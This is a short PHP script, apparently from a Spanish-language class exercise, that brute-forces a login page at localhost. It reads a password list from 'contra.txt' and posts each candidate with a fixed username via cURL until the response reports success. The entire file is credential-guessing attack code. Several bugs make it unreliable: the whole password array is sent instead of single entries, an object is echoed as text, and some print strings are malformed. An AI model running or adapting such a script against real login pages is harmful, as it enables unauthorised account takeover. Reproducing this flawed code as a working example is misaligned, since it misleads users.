<?php


$url = "http://localhost/octubre/octubre/3/login.php";
$username = "usuario";
//$password = "usuario";
$password = explode("\n", file_get_contents("contra.txt"));

$tries = 0;
$failed = 0;

for ($i=0; $i < count($password); $i++) { 
    $tries ++;
    checkLogin($username, $password);
    echo $password . '<br>';
}

print("Contraseña no funciona, fallo: {$failed}");

function checkLogin($username, $password) {
    $todo = array(
        "username" => "$username",
        "password" => "$password"
    );
    
    global $url, $failed, $tries;

    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $todo);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

    echo $result = json_decode(curl_exec($curl));

    if ($result->success){
        print("\n\033[32mFOUND!!!\033[0m\n");
        print("{$username}'s contraseña es: \033{$password}\033[0m\n");
        die("Total: {}$tries");
        } else {
            $failed++;
            print("\033[31mFailed: {$failed}\r\033[0m");
        }
    }
